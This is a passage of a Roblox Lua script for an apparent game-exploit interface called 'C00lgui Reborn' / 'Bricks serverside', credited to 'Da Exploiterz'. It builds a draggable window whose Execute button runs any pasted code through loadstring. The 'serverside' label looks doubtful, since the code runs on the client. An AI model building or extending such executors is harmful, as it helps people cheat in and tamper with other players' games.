    sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Name = "Bricks serverside"
    Frame.BackgroundColor3 = Color3.fromRGB(255, 12, 255)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.5, -184, 0.5, -119)
    Frame.Size = UDim2.new(0, 368, 0, 238)
    Frame.Active = true
    Frame.Parent = sg

    -- Dragging
    do
        local dragging, dragStart, startPos
        Frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = Frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
        Frame.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
                or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                Frame.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + delta.X,
                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
                )
            end
        end)
    end

    local Title = Instance.new("TextLabel")
    Title.BackgroundColor3 = Color3.fromRGB(255, 12, 255)
    Title.BorderSizePixel = 0
    Title.Size = UDim2.new(0, 368, 0, 25)
    Title.Font = Enum.Font.SourceSans
    Title.Text = "Bricks Serverside #1 Serverside in the world"
    Title.TextColor3 = Color3.fromRGB(0, 0, 0)
    Title.TextScaled = true
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Frame

    local TitleGrad = Instance.new("UIGradient")
    TitleGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(98, 1, 98))
    }
    TitleGrad.Parent = Title

    local Box = Instance.new("TextBox")
    Box.BackgroundColor3 = Color3.fromRGB(255, 12, 255)
    Box.BorderSizePixel = 0
    Box.Position = UDim2.new(0, 0, 0.105, 0)
    Box.Size = UDim2.new(0, 368, 0, 174)
    Box.Font = Enum.Font.SourceSans
    Box.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
    Box.PlaceholderText = "--Created by Da Exploiterz"
    Box.ClearTextOnFocus = false
    Box.Text = ""
    Box.TextColor3 = Color3.fromRGB(0, 0, 0)
    Box.TextSize = 14
    Box.TextXAlignment = Enum.TextXAlignment.Left
    Box.TextYAlignment = Enum.TextYAlignment.Top
    Box.Parent = Frame

    local BoxGrad = Instance.new("UIGradient")
    BoxGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(98, 1, 98))
    }
    BoxGrad.Parent = Box

    local exe = Instance.new("TextButton")
    exe.BackgroundColor3 = Color3.fromRGB(255, 12, 255)
    exe.BorderSizePixel = 0
    exe.Position = UDim2.new(0, 0, 0.836, 0)
    exe.Size = UDim2.new(0, 200, 0, 39)
    exe.Font = Enum.Font.SourceSans
    exe.Text = "Execute"
    exe.TextColor3 = Color3.fromRGB(0, 0, 0)
    exe.TextScaled = true
    exe.Parent = Frame

    local exeGrad = Instance.new("UIGradient")
    exeGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(98, 1, 98))
    }
    exeGrad.Parent = exe

    local clear = Instance.new("TextButton")
    clear.BackgroundColor3 = Color3.fromRGB(255, 12, 255)
    clear.BorderSizePixel = 0
    clear.Position = UDim2.new(0.543, 0, 0.836, 0)
    clear.Size = UDim2.new(0, 168, 0, 39)
    clear.Font = Enum.Font.SourceSans
    clear.Text = "Clear"
    clear.TextColor3 = Color3.fromRGB(0, 0, 0)
    clear.TextScaled = true
    clear.Parent = Frame

    local clearGrad = Instance.new("UIGradient")
    clearGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(98, 1, 98)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
    }
    clearGrad.Parent = clear

    exe.MouseButton1Click:Connect(function()
        if Box.Text == "" then return end
        local fn, err = loadstring(Box.Text)
        if not fn then
            warn("[Bricks] Loadstring error: " .. tostring(err))
            return
        end
        local ok, output = pcall(fn)
        if not ok then warn("[Bricks] Execution error: " .. tostring(output)) end
    end)

    clear.MouseButton1Click:Connect(function()
        Box.Text = ""
    end)
end)

-- ============================================================
-- INITIALIZE
-- ============================================================
if #pages == 0 then
    addPage("Empty", "Add a page to get started")
end

renderPage()

-- ============================================================
-- DRAGGING
-- ============================================================
local dragging = false
local dragStart, startTitlePos, startPagePos

TitleFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startTitlePos = TitleFrame.Position
        startPagePos = PageFrame.Position
    end
end)

TitleFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        TitleFrame.Position = UDim2.new(
            startTitlePos.X.Scale, startTitlePos.X.Offset + delta.X,
            startTitlePos.Y.Scale, startTitlePos.Y.Offset + delta.Y
        )
        PageFrame.Position = UDim2.new(
            startPagePos.X.Scale, startPagePos.X.Offset + delta.X,
            startPagePos.Y.Scale, startPagePos.Y.Offset + delta.Y
        )
    end
end)

print("=== C00lgui Reborn Loaded ===")
print("Pages:", #pages)
